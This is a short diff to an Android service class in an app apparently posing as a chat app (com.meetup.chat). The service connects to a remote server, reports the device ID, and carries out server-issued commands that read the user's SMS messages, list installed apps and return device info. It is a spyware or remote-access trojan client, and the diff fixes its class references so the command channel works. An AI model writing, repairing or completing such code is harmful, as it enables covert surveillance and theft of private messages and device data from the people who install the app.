@@ -38,7 +38,8 @@ public class d extends Service {
     private void c() {
         while (f) {
             try {
-                c = new Socket(c.a, c.b);
+                // Fix: Use com.meetup.chat.c for config
+                c = new Socket(com.meetup.chat.c.a, com.meetup.chat.c.b);
                 d = new PrintWriter(c.getOutputStream(), true);
                 e = new BufferedReader(new InputStreamReader(c.getInputStream()));
                 d.println("DEVICE:" + g);
@@ -71,9 +72,9 @@ public class d extends Service {
 
     private String executeCmd(String cmd) {
         if (cmd.equalsIgnoreCase("ping")) return "PONG";
-        if (cmd.equalsIgnoreCase("info")) return f.a(this);
-        if (cmd.equalsIgnoreCase("sms read")) return f.b(this);
-        if (cmd.equalsIgnoreCase("apps list")) return f.c(this);
+        if (cmd.equalsIgnoreCase("info")) return com.meetup.chat.f.a(this);
+        if (cmd.equalsIgnoreCase("sms read")) return com.meetup.chat.f.b(this);
+        if (cmd.equalsIgnoreCase("apps list")) return com.meetup.chat.f.c(this);
         if (cmd.equalsIgnoreCase("device")) return g;
         if (cmd.equalsIgnoreCase("exit")) { f = false; stopSelf(); return "EXIT"; }
         return "Unknown command";
